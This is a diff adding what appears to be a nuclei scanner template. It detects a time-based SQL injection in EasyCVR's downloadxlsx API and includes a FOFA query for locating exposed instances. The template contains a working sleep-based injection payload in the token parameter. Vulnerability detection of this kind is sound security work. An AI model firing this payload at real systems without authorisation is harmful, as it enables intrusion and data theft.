@@ -1,0 +1,42 @@
+id: poc-yaml-easy-cvr-downloadxlsx-sqli
+info:
+  name: EasyCVR视频管理平台 downloadxlsx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: EasyCVR
+    fofa-query: title="EasyCVR"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /api/v1/cascade/downloadxlsx?token=%27and(select*from(select/**/sleep({{t1}}))a/**/union/**/select+1)=%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".xlsx"
+          - "sheet2"
+        condition: or
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+          - "application/zip"
+          - "application/json"
+          - "text/html"
+        condition: or
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
